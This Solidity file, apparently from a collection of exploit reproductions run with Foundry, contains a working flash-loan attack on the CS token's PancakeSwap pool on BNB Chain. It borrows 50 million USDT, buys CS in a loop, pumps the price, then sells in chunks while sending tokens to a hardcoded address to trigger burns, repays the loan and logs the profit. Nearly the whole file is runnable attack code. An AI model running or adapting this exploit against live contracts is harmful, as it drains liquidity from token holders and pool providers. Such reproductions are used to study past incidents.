import {RuinLocation} from "./ruins/RuinLocation.sol";

import {
    BSC_USD as USDT,
    PANCAKE_ROUTER,
    PANCAKE_USDT_CS_PAIR as USDT_CS_PAIR,
    PANCAKE_USDT_BUSD_PAIR as USDT_BUSD_PAIR
} from "../../constants/bsc.sol";

import {IERC20} from "../../interfaces/tokens/IERC20.sol";
import {IPancakePair} from "../../interfaces/dex/pancakeswap/IPancakePair.sol";
import {IPancakeCallee} from "../../interfaces/dex/pancakeswap/IPancakeCallee.sol";
import {IPancakeRouter} from "../../interfaces/dex/pancakeswap/IPancakeRouter.sol";

import "forge-std/console.sol";


interface ICS {
    function canBuy() external view returns (bool);
    function canSell() external view returns (bool);
    function canContract() external view returns (bool);
    function isTransFee() external view returns (bool);
    function isSellFee() external view returns (bool);
    function isBuyFee() external view returns (bool);
    function sellAmount() external view returns (uint);
    function toDayPrice() external view returns (uint);
    function preDayPrice() external view returns (uint);
    function toDayOpenPrice() external view returns (uint);
    function currentSellPlusFee() external view returns (uint);
    function onLineTime() external view returns (uint);
    function totalSellFee() external view returns (uint);
    function onLineTimeInterval() external view returns (uint);
    function totalSellFeeOnline45() external view returns (uint);
    function toDay() external view returns(uint);
    function getToDay() external view returns(uint);
    function maxBurnAmount() external view returns(uint);
    function totalBurnAmount() external view returns(uint);
    function exPairs(address) external view returns (bool);
    function feeWhiteList(address) external view returns (bool);
    function getBuyPrice(address _address) external view returns(uint256);
    function getSellPrice(address _address) external view returns(uint256);
    function recv() external view returns(address);
}

contract Shaman is RuinLocation, IPancakeCallee {
    
    function peek() external {
        uint r_usdt;
        uint r_cs;
        (r_usdt, r_cs, ) = IPancakePair(USDT_CS_PAIR).getReserves();
        console.log("r_USDT = %s, r_CS = %s", r_usdt, r_cs);
        console.log("CS balance = %s", IERC20(CS).balanceOf(address(CS)));

        console.log("sellAmount = %s", ICS(CS).sellAmount());

        console.log("isTransFee = %s, isSellFee = %s, isBuyFee = %s", ICS(CS).isTransFee(), ICS(CS).isSellFee(), ICS(CS).isBuyFee());
        console.log("canBuy = %s, canSell = %s, canContract = %s", ICS(CS).canBuy(), ICS(CS).canSell(), ICS(CS).canContract());
        console.log("exPairs[USDT_CS_PAIR] = ", ICS(CS).exPairs(USDT_CS_PAIR));

        console.log("feeWhiteList[USDT_CS_PAIR] = %s, feeWhiteList[RECV] = ", ICS(CS).feeWhiteList(USDT_CS_PAIR), ICS(CS).feeWhiteList(RECV));
   
        console.log("toDayPrice = %s, preDayPrice = %s, toDayOpenPrice = %s", ICS(CS).toDayPrice(), ICS(CS).preDayPrice(), ICS(CS).toDayOpenPrice());
        console.log("toDay = %s, getToDay = %s", ICS(CS).toDay(), ICS(CS).getToDay());
    
        console.log("maxBurnAmount = %s, totalBurnAmount = %s", ICS(CS).maxBurnAmount(), ICS(CS).totalBurnAmount());
    
        console.log("getBuyPrice = %s, getSellPrice = %s", ICS(CS).getBuyPrice(USDT_CS_PAIR), ICS(CS).getSellPrice(USDT_CS_PAIR));

        console.log("currentSellPlusFee = %s", ICS(CS).currentSellPlusFee());
    }

    function beat() external {
        IPancakePair(USDT_BUSD_PAIR).swap(50_000_000e18, 0, address(this), hex"00");
        
        console.log("[>*BOOM*<] Profit = %s USDT", IERC20(USDT).balanceOf(address(this)));
    }

    function pancakeCall(address, uint amount0, uint, bytes calldata) external {
        if (msg.sender != USDT_BUSD_PAIR) {
            return;
        }

        // Step 1: buy the CS token
        IERC20(USDT).approve(PANCAKE_ROUTER, type(uint).max);
        address[] memory _path = new address[](2);
        _path[0] = USDT;
        _path[1] = CS;
        for(uint i; i < 500;){
            IPancakeRouter(payable(PANCAKE_ROUTER)).swapTokensForExactTokens(LIMIT_BUY, 80000000000000000000000000, _path, address(this), block.timestamp);
            unchecked {
                ++i;
            }
        }

        // Step 2: Pump the price of the CS token 
        uint usdtRemain = IERC20(USDT).balanceOf(address(this));
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(usdtRemain, 1, _path, 0x06997D1793c3d7ed7993E1EBe48346c0F8F00779, block.timestamp);
        
        // Step 3: Sell the CS token and transfer to burn pair reserve
        IERC20(CS).approve(PANCAKE_ROUTER, type(uint).max);
        _path[0] = CS;
        _path[1] = USDT;
        while(IERC20(CS).balanceOf(address(this)) >= LIMIT_SELL){
            IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(LIMIT_SELL, 1, _path, address(this), block.timestamp);
            IERC20(CS).transfer(0x06997D1793c3d7ed7993E1EBe48346c0F8F00779, 1);
        }
        
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(CS).balanceOf(address(this)), 1, _path, address(this), block.timestamp);

        // Step 4: repay the flashloan
        IERC20(USDT).transfer(msg.sender, (amount0 + 1) * 1000  / 997);
    }
}